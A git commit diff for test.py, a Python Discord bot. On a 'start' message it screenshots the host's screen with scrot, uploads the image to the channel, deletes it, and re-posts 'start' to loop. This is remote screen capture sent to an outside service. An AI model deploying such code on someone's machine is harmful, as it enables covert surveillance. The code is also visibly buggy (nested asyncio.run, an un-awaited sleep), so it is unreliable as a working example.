acde497237e639cd164c7c784b1c3e4dfff28362
theoneslayingadam <125176446+theoneslayingadam@users.noreply.github.com>
2023-02-23 18:43:57 +0700

    Update test.py

--- test.py
+++ test.py
@@ -7,11 +7,8 @@ intents = discord.Intents().default()
 intents.message_content = True
 client = discord.Client(intents=intents)
 token = "INSERTTOKENHERE"
-n = 1
-i = 10
 async def async_func():
  await asyncio.create_subprocess_shell('scrot screen.png')
-
 async def async_func1():
  await asyncio.create_subprocess_shell('rm screen.png')
 @client.event
@@ -20,11 +17,9 @@ async def on_ready():
 @client.event
 async def on_message(message):
  if message.content.startswith('start'):
-  while True:
-   if n > i:
-    asyncio.run(async_func())
-    await channel.send(file=discord.File('screen.png'))
-    asyncio.run(async_func1())
-   else:
-    asyncio.sleep(0.5)
+  asyncio.run(async_func())
+  await message.channel.send(file=discord.File('screen.png'))
+  asyncio.run(async_func1())
+  asyncio.sleep(0.5)
+  await message.channel.send("start")
 client.run(token)
